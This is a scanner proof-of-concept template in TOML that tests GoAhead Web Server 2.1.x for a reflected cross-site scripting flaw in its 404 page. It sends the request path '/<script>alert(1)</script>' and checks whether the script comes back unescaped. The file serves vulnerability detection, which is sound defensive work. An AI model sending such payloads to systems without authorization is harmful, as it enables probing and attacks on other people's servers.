[info]
author = "ave"
description = "向 GoAhead Web Server 2.1.x 发送包含 XSS 载荷的 URL 请求不存在的路径，验证 404 错误页面未对脚本进行转义导致跨站脚本执行"
id = "POC-AVE-2002-0385"
name = "GoAhead Web Server 2.1.x 404 Error Page XSS PoC"
severity = "high"
tags = ["ave-2002-0385"]
vuln_id = [
    "CVE-2002-0681",
    "AVE-2002-0385",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/<script>alert(1)</script>"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert(1)</script>"]
